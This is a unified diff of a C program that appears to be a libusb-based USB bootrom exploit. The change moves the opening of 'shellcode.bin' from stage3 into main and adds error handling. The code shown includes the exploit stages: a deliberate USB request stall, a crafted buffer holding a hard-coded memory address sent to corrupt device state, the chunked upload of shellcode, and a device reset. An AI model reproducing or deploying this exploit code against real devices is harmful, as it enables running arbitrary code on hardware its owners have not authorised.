@@ -214,13 +214,12 @@ void stage2(libusb_device_handle *handle)
 	libusb_control_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 0);
 }
 
-void stage3(libusb_device_handle *handle)
+void stage3(libusb_device_handle *handle, int fd)
 {
 	char buffer[0x800] = {0};
 
 	size_t i;
 	ssize_t size;
-	int fd;
 
 	/* usb_req_stall: read spanish iSerialNumber */
 	if(0 > libusb_control_transfer(handle, 2, 3, 0, 0x80, NULL, 0, 10)) {
@@ -236,10 +235,8 @@ void stage3(libusb_device_handle *handle)
 	*((uint64_t*)(buffer + 0x5A8)) = 0x1800B0800; // ?
 	libusb_control_transfer(handle, LIBUSB_ENDPOINT_OUT, 0, 0, 0, buffer, 0x5B0, 0);
 
-	fd = open("shellcode.bin", O_RDONLY);
 	while(0 < (size = read(fd, buffer, sizeof(buffer))))
 		libusb_control_transfer(handle, 0x21, 1, 0, 0, buffer, size, 10);
-	close(fd);
 
 	if(0 != libusb_reset_device(handle)) {
 		perror("libusb_reset_device");
@@ -248,6 +245,8 @@ void stage3(libusb_device_handle *handle)
 
 int main(int argc, char* argv[])
 {
+	int fd;
+
 	libusb_context *ctx;
 	libusb_device_handle *handle;
 	libusb_device *dev;
@@ -260,6 +259,11 @@ int main(int argc, char* argv[])
 	int ret;
 
 	ret = EXIT_FAILURE;
+
+	if(0 > (fd = open("shellcode.bin", O_RDONLY))) {
+		perror("open(shellcode.bin)");
+		return EXIT_FAILURE;
+	}
 
 	/* create a context */
 	if(0 != libusb_init(&ctx)) {
@@ -340,7 +344,7 @@ int main(int argc, char* argv[])
 		goto clean2;
 	}
 
-	stage3(handle);
+	stage3(handle, fd);
 
 	libusb_release_interface(handle, 0);
 	libusb_close(handle);
@@ -373,5 +377,6 @@ clean1:
 	libusb_exit(ctx);
 
 clean0:
+	close(fd);
 	return ret;
 }
